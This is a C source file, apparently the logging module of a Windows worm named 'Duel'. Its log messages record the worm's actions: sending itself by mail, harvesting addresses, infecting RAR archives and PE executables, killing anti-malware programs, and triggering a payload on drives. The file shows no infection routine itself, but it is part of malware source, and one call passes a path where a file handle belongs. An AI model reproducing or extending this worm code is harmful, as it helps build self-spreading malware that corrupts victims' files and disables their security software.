#include "stdafx.h"
#include "prototypes.h"


char LogFileName[]="\\Duel.log";


void AddToLog(char Data[],int Type,BOOL Success)
{
	char LogLine[512],tempbuf[256];
	char LogFile[MAX_PATH];
	DWORD WrittenBytes=0;
	HANDLE hlogfile;

	GetWindowsDirectory(LogFile,MAX_PATH);

	lstrcat(LogFile,LogFileName);

	hlogfile=CreateFile(LogFile,GENERIC_WRITE,FILE_SHARE_READ,NULL,
		OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hlogfile!=INVALID_HANDLE_VALUE)
	{

		SetFilePointer(hlogfile,GetFileSize(LogFile,NULL),NULL,FILE_END);

		switch(Type)
		{
		case Duel_Log_Mail_Sended:

			if(Success==TRUE)
				lstrcpy(tempbuf,"Successfully To Send Mail To");
			else
				lstrcpy(tempbuf,"Failed To Send Mail To");			

			break;

		case Duel_Log_Mail_Founded:

			lstrcpy(tempbuf,"Mail Founded");

			break;

		case Duel_Log_RarArchive:

			if(Success==TRUE)
				lstrcpy(tempbuf,"Successfully To Infect Rar Archive");
			else
				lstrcpy(tempbuf,"Failed To Infect Rar Archive");
		
			break;

		case Duel_Log_Executble:

			if(Success==TRUE)
				lstrcpy(tempbuf,"Successfully To Infect PE File");
			else
				lstrcpy(tempbuf,"Failed To Infect Pe File");

			break;
		case Duel_Log_AV_Killed:

			lstrcpy(tempbuf,"Killed Anti-Malware Program Named");

			break;

		case Duel_Log_Startup:

			lstrcpy(tempbuf,"[Duel Worm Started]\r\nRunning Path");
		
			break;

		case Duel_Log_Payload:

			lstrcpy(tempbuf,"Duel Payload Actived On Drive");

			break;

		case Duel_Log_Notify:
			
			lstrcpy(tempbuf,"Duel Infection Notify Success");

			break;

		case Duel_Log_Custom:
			
			lstrcpy(tempbuf,"Custom Log");

			break;
		}

		wsprintf(LogLine,"%s:%s\r\n",tempbuf,Data);
		WriteFile(hlogfile,LogLine,lstrlen(LogLine),&WrittenBytes,NULL);
		CloseHandle(hlogfile);
	}
}